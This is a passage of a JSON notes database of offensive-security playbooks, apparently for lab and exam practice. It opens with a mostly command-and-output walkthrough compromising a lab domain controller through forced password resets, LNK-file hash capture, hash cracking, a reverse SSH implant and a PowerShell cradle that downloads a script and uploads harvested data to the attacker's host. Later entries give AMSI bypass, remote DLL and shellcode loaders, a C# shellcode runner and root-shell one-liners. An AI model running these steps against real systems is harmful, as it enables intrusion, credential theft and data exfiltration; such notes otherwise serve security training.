            "code": "bloodyAD -d BUILDINGMAGIC.LOCAL -u r.haggard -p 'rubeushagrid' --host 10.1.176.13 set password H.POTCH 'Passw0rd!2025'"
          },
          {
            "lang": "bash",
            "code": "[+] Password changed successfully!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mark user as Owned",
        "codes": [
          {
            "lang": "bash",
            "code": "mark owned H.POTCH@BUILDINGMAGIC.LOCAL"
          },
          {
            "lang": "bash",
            "code": "# Output\n[*] Owned Principals\n    Found 3 owned principal(s)\n+-------------------------------------+------+---------+-------+\n| Name                                | Type | Enabled | Admin |\n+-------------------------------------+------+---------+-------+\n| [!] H.POTCH@BUILDINGMAGIC.LOCAL     | User | True    | False |\n| [!] R.HAGGARD@BUILDINGMAGIC.LOCAL   | User | True    | False |\n| [!] R.WIDDLETON@BUILDINGMAGIC.LOCAL | User | True    | False |\n+-------------------------------------+------+---------+-------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "authfinder",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'h.potch' 'Passw0rd!2025' --domain buildingmagic"
          },
          {
            "lang": "bash",
            "code": "Target           Username         Password             Service      Result\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n10.1.176.13      h.potch          Passw0rd!2025        smbexec      Auth\n10.1.176.13      h.potch          Passw0rd!2025        wmi          Auth\n10.1.176.13      h.potch          Passw0rd!2025        psexec       Auth\n10.1.176.13      h.potch          Passw0rd!2025        atexec       Auth\n10.1.176.13      h.potch          Passw0rd!2025        rdp          Auth\n10.1.176.13      h.potch          Passw0rd!2025        ldap         Auth\n10.1.176.13      h.potch          Passw0rd!2025        kerberos     Auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'h.potch' -p 'Passw0rd!2025' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/h.potch_nxc_enum_results.txt"
          },
          {
            "lang": "bash",
            "code": "# Output\nACCESSIBLE SHARES (4)\nShare           Access       Comment\n--------------- ------------ ------------------------------\nFile-Share      READ,WRITE   Central Repository of Build...\nIPC$            READ         Remote IPC\nNETLOGON        READ         Logon server share\nSYSVOL          READ         Logon server share\n\nNO ACCESS (2)\nShare           Comment\n--------------- ------------------------------\nADMIN$          Remote Admin\nC$              Default share"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`H.Potch` has *Write* Access to the File-Share",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Setup ntlm_theft",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/ && git clone https://github.com/Greenwolf/ntlm_theft"
          },
          {
            "lang": "bash",
            "code": "cd ntlm_theft && python3 -m venv ntlm_theft_venv && source ntlm_theft_venv/bin/activate"
          },
          {
            "lang": "bash",
            "code": "pip3 install xlsxwriter"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Malicious Files",
        "substeps": [
          {
            "title": "Responder Event Captured",
            "codes": [
              {
                "lang": "bash",
                "code": "h.grangon::BUILDINGMAGIC:7b2463a8a01bbe7d:9449534E573AEBE1AADF51B00D768889:010100000000000080F7486A6A91DC01E0B9FCA7295A9EEB00000000020008004800490044004E0001001E00570049004E002D004900350037005100450048003500460034004500300004003400570049004E002D00490035003700510045004800350046003400450030002E004800490044004E002E004C004F00430041004C00030014004800490044004E002E004C004F00430041004C00050014004800490044004E002E004C004F00430041004C000700080080F7486A6A91DC01060004000200000008003000300000000000000000000000004000005B20A9CE754E3CA78262C0A2A96FC0BE8B61E0831AAC51CC5546F3243D86E36F0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00320035002E003100330038000000000000000000"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "responder -I tun0"
          },
          {
            "lang": "bash",
            "code": "nxc smb 10.1.176.13 -u 'h.potch' -p 'Passw0rd!2025' -M slinky -o SERVER=10.200.25.138 NAME=payroll"
          },
          {
            "lang": "bash",
            "code": "# Output\n[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded\nSMB         10.1.176.13     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.176.13     445    DC01             [+] BUILDINGMAGIC.LOCAL\\h.potch:Passw0rd!2025\nSMB         10.1.176.13     445    DC01             [*] Enumerated shares\nSMB         10.1.176.13     445    DC01             Share           Permissions     Remark\nSMB         10.1.176.13     445    DC01             -----           -----------     ------\nSMB         10.1.176.13     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.176.13     445    DC01             C$                              Default share\nSMB         10.1.176.13     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.\nSMB         10.1.176.13     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.176.13     445    DC01             NETLOGON        READ            Logon server share\nSMB         10.1.176.13     445    DC01             SYSVOL          READ            Logon server share\nSLINKY      10.1.176.13     445    DC01             [+] Found writable share: File-Share\nSLINKY      10.1.176.13     445    DC01             [+] Created LNK file on the File-Share share"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Start Responder or ntlmrelayx first to capture the auth."
          }
        ]
      },
      {
        "title": "Cracking Captured Hashes",
        "substeps": [
          {
            "title": "NTLMv2 (hashcat mode 5600)",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 5600 hashes.txt wordlist.txt -r best64.rule"
              },
              {
                "lang": "bash",
                "code": "# Output\nmagic4ever"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Hash cracked for `h.grangon`, password: `magic4ever`",
                "variant": "important"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Set user as Owned",
        "codes": [
          {
            "lang": "bash",
            "code": "mark owned H.GRANGON@BUILDINGMAGIC.LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`H.GRANGON@BUILDINGMAGIC.LOCAL` is an Admin",
            "variant": "important"
          }
        ]
      },
      {
        "title": "authfinder",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'h.grangon' 'magic4ever' --domain buildingmagic"
          },
          {
            "lang": "bash",
            "code": "Target           Username         Password             Service      Result\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n10.1.176.13      h.grangon        magic4ever           winrm        Auth+Exec\n10.1.176.13      h.grangon        magic4ever           smbexec      Auth Only\n10.1.176.13      h.grangon        magic4ever           wmi          Auth Only\n10.1.176.13      h.grangon        magic4ever           psexec       Auth Only\n10.1.176.13      h.grangon        magic4ever           atexec       Auth Only\n10.1.176.13      h.grangon        magic4ever           rdp          Auth Only\n10.1.176.13      h.grangon        magic4ever           ldap         Auth\n10.1.176.13      h.grangon        magic4ever           kerberos     Auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "substeps": [
          {
            "title": "Impacket Shel",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/impacket-shell && python -m impacket_shell --target buildingmagic.local -u h.grangon -p 'magic4ever' -d buildingmagic -vv -A --log /root/machines/BuildingMagicAD/10.1.176.13/impacket_shell.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nwinrm_shell\n> cd Desktop\n> type user.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -p 'magic4ever' -u 'h.grangon' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/h.grangon_nxc_enum_results.txt"
          },
          {
            "lang": "bash",
            "code": "AdminCount=1 Accounts (4):\n------------------------------\na.flatch\nadministrator\nh.grangon\nkrbtgt"
          }
        ]
      },
      {
        "title": "Upload RSSH",
        "substeps": [
          {
            "title": "Execute RSSH",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket(buildingmagic.local)> winrm rev2.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Connect to RSSH",
            "codes": [
              {
                "lang": "bash",
                "code": "ssh -MS /tmp/socket -p 44569 reverse@127.0.0.1\n# c60295f82358181a"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell Survey",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/powershellSurvey && ./serve-tools.sh"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Latch.ps1",
            "codes": [
              {
                "lang": "powershell",
                "code": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.200.25.138/Latch.ps1'); Invoke-Latch -Zip -Upload http://10.200.25.138:8000/upload -Cleanup\""
              },
              {
                "lang": "bash",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "./build.sh reverse 10.200.25.138:443"
          },
          {
            "lang": "bash",
            "code": "[*] Build Configuration:\n[*]   Mode:     reverse\n[*]   Target:   reverse@10.200.25.138:443\n[*]   BindPort: random (allocated by SSH server)"
          }
        ]
      },
      {
        "title": "Interesting File",
        "codes": [
          {
            "lang": "bash",
            "code": "winrm_download C:\\INETPUB\\wwwroot\\buildingmagic-app\\backups\\bm_employee_registry.db  /root/machines/BuildingMagicAD/10.1.176.13/registry.db"
          },
          {
            "lang": "bash",
            "code": "file"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Web Enumeration",
        "substeps": [
          {
            "title": "Directory Busting",
            "codes": [
              {
                "lang": "bash",
                "code": "feroxbuster -u http://10.1.176.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Vulnerability Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "nikto -h http://10.1.176.13 -o nikto.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Subdomain Enumeration",
            "codes": [
              {
                "lang": "bash",
                "code": "ffuf -u http://buildingmagic -H \"Host: FUZZ.buildingmagic\" -w /usr/share/seclists/Discovery/Web-Content/subdomains-top1million-5000.txt -fc 301,302 -o subs.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "cd /root/machines/BuildingMagicAD/10.1.176.13/web"
          }
        ]
      },
      {
        "title": "Initial Foothold",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Document how initial access was obtained."
          }
        ]
      },
      {
        "title": "Privilege Escalation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Document privesc path."
          }
        ]
      },
      {
        "title": "Potential Credentials Discovered",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "text",
                "code": "r.widdleton"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "text",
                "code": "lilronron"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hash",
            "codes": [
              {
                "lang": "text",
                "code": "<NTHash>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Credentials Discovered",
        "substeps": [
          {
            "title": "Username",
            "codes": [
              {
                "lang": "text",
                "code": "r.widdleton"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password",
            "codes": [
              {
                "lang": "text",
                "code": "lilronron"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hash",
            "codes": [
              {
                "lang": "text",
                "code": "<NTHash>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Lessons Learned",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key takeaways and techniques to remember."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "RustScan",
        "url": "https://github.com/RustScan/RustScan"
      },
      {
        "text": "feroxbuster",
        "url": "https://github.com/epi052/feroxbuster"
      },
      {
        "text": "nikto",
        "url": "https://github.com/sullo/nikto"
      },
      {
        "text": "ffuf",
        "url": "https://github.com/ffuf/ffuf"
      },
      {
        "text": "nmap",
        "url": "https://github.com/nmap/nmap"
      },
      {
        "text": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      },
      {
        "text": "authfinder",
        "url": "https://github.com/Real-Fruit-Snacks/authfinder"
      },
      {
        "text": "nxc_enum",
        "url": "https://github.com/Real-Fruit-Snacks/nxc_enum"
      }
    ],
    "lab": true
  },
  {
    "category": "Evil-WinRM",
    "title": "Built-in Commands",
    "tags": [],
    "steps": [
      {
        "title": "View Menu",
        "codes": [
          {
            "lang": "powershell",
            "code": "menu"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Displays all available Evil-WinRM commands and loaded scripts/binaries.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Bypass AMSI",
        "codes": [
          {
            "lang": "powershell",
            "code": "Bypass-4MSI"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Run this immediately after connecting to bypass AMSI detection.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "DLL Loader",
        "codes": [
          {
            "lang": "powershell",
            "code": "Dll-Loader -http -path http://<AttackerIP>/payload.dll"
          },
          {
            "lang": "powershell",
            "code": "Dll-Loader -local -path C:\\Windows\\Temp\\payload.dll"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Donut Loader",
        "codes": [
          {
            "lang": "powershell",
            "code": "Donut-Loader -http -path http://<AttackerIP>/payload.bin"
          },
          {
            "lang": "powershell",
            "code": "Donut-Loader -local -path C:\\Windows\\Temp\\payload.bin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Invoke-Binary",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-Binary <BinaryPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Executes binaries from the directory specified with `-e` flag.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Security Headers Scanning",
    "title": "Burp Suite Header Analysis",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Passive Scanning",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Burp Suite automatically flags missing security headers.",
            "variant": "tip"
          },
          {
            "type": "text",
            "content": "**Steps:**\n1. Browse target application through Burp proxy\n2. Check **Target > Site map**\n3. Look for **Issue Activity** tab\n4. Filter for \"Missing security headers\""
          }
        ]
      },
      {
        "title": "Manual Inspection",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. Intercept response in **Proxy > HTTP history**\n2. Check **Response > Headers** tab\n3. Look for security-related headers"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "CSharp AV Bypass",
    "title": "C# Shellcode Runner vs Antivirus",
    "tags": [
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "Basic C# Runner (Detected)",
        "codes": [
          {
            "lang": "csharp",
            "code": "// This will likely be detected\nbyte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };\nIntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\nMarshal.Copy(buf, 0, addr, buf.Length);\nCreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "This basic implementation will likely be detected by AV.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "ired.team - AV Evasion",
        "url": "https://www.ired.team/offensive-security/defense-evasion"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Custom C# shellcode runners can evade AV through encryption and obfuscation.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Capabilities Exploitation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Find Capabilities",
        "codes": [
          {
            "lang": "bash",
            "code": "getcap -r / 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Exploitable Capabilities",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Dangerous capabilities:\n- **cap_setuid** - Can change UID to root\n- **cap_dac_read_search** - Bypass file read permission checks\n- **cap_dac_override** - Bypass file permission checks",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Python cap_setuid",
        "codes": [
          {
            "lang": "bash",
            "code": "# If python has cap_setuid+ep\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Perl cap_setuid",
        "codes": [
          {
            "lang": "bash",
            "code": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Spraying",
    "title": "Check Password Policy [optional]",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Look for: Lockout Threshold, Lockout Duration",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p <Password> --pass-pol"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "Checking for Required Privileges",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nwhoami /priv\n```"
      },
      {
        "type": "text",
        "content": "```cmd\nwhoami /priv | findstr \"SeImpersonate SeAssignPrimaryToken\"\n```"
      },
      {
        "type": "note",
        "content": "If either privilege is **Enabled**, you can use Potato attacks to escalate to SYSTEM.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Checking if /etc/passwd is Writable",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nls -l /etc/passwd\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Check write permissions\nls -l /etc/passwd\n# Output: -rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd\n#         ^^^ ^^^ ^^^\n#         Owner Group Others - All have write permission!\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Test if writable\ntest -w /etc/passwd && echo \"Writable!\" || echo \"Not writable\"\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Checking Shell Type",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Check if shell is interactive\necho $-\n# Output with 'i' means interactive"
      },
      {
        "type": "text",
        "content": "# Check shell type\necho $SHELL"
      },
      {
        "type": "text",
        "content": "# Check if PTY\ntty\n# Output: /dev/pts/0 (good)\n# Output: not a tty (bad)\n```"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Cleanup",
    "tags": [],
    "steps": [
      {
        "title": "Remove Added User",
        "codes": [
          {
            "lang": "bash",
            "code": "# Remove the line\nsed -i '/^hacker:/d' /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Restore Original Permissions",
        "codes": [
          {
            "lang": "bash",
            "code": "# If you changed permissions\nchmod 644 /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Resource-Based Constrained Delegation",
    "title": "Cleanup [optional]",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Remove RBCD Configuration",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-rbcd -delegate-to <Target>$ -delegate-from ATTACK$ -dc-ip <DC-IP> -action remove <Domain>/<User>:<Password>"
          },
          {
            "lang": "powershell",
            "code": "Set-ADComputer <TargetComputer> -Clear 'msds-allowedtoactonbehalfofotheridentity'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delete Machine Account",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-addcomputer -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Clear Tickets",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nklist purge\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n.\\mimikatz.exe \"kerberos::purge\" \"exit\"\n```"
      }
    ]
  },
  {
    "category": "Client-Side Attack Recon",
    "title": "Client Fingerprinting",
    "tags": [
      "Initial_Access",
      "Reconnaissance",
      "Social_Engineering"
    ],
    "steps": [
      {
        "title": "Canarytokens",
        "codes": [
          {
            "lang": "bash",
            "code": "https://canarytokens.org/generate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Free service that generates tracking links. When clicked, reveals IP, browser, OS info."
          }
        ]
      },
      {
        "title": "Create Tracking Token",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Select \"Web bug / URL token\" -> Enter webhook URL -> Click \"Create my Canarytoken\""
          }
        ]
      },
      {
        "title": "Other Fingerprinting Methods",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Alternative fingerprinting tools:\n- **Grabify** - IP logger service\n- **fingerprint.js** - JavaScript fingerprinting library",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Canarytoken File Types",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Can embed tokens in Word documents, PDFs, or images that trigger when opened.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Gather OS and browser info from targets on internal networks before launching attacks. Use tracking links."
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "Command Execution",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Execute Command via SMB",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -x 'whoami'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`-x` executes cmd.exe commands.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Execute PowerShell Command",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -X 'Get-Host'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`-X` executes PowerShell commands.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Execute on Multiple Targets",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' -x 'hostname'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Command Execution via Browser",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "URL Bar Execution",
        "codes": [
          {
            "lang": "text",
            "code": "javascript:alert(1)\ndata:text/html,<script>alert(1)</script>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "File Protocol Browsing",
        "codes": [
          {
            "lang": "text",
            "code": "file:///etc/passwd\nfile:///home/kiosk/.bashrc\nfile:///proc/self/environ"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Developer Tools",
        "codes": [
          {
            "lang": "javascript",
            "code": "// In browser console\nfetch('file:///etc/passwd').then(r=>r.text()).then(console.log)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Browser dev tools access:\n- **F12** or **Ctrl+Shift+I** - Open dev tools\n- Console tab allows JavaScript execution",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Reference",
    "title": "Common Commands Reference",
    "tags": [
      "Linux"
    ],
    "steps": [
      {
        "title": "File Operations",
        "codes": [
          {
            "lang": "bash",
            "code": "# Find files\nfind / -name \"filename\" 2>/dev/null\nfind / -type f -name \"*.conf\" 2>/dev/null\n\n# Search file contents\ngrep -r \"pattern\" /path 2>/dev/null\n\n# File permissions\nchmod 755 file\nchmod +x file\nchown user:group file\n\n# Create/extract archives\ntar -czf archive.tar.gz /path\ntar -xzf archive.tar.gz"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Text Processing",
        "codes": [
          {
            "lang": "bash",
            "code": "# View files\ncat file\nless file\nhead -n 20 file\ntail -n 20 file\ntail -f /var/log/syslog\n\n# Search and filter\ngrep \"pattern\" file\ngrep -i \"pattern\" file  # case insensitive\ngrep -v \"pattern\" file  # invert match\ngrep -r \"pattern\" /path # recursive\n\n# Text manipulation\nsed 's/old/new/g' file\nawk '{print $1}' file\ncut -d: -f1 /etc/passwd\nsort file\nuniq file"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "System Information",
        "codes": [
          {
            "lang": "bash",
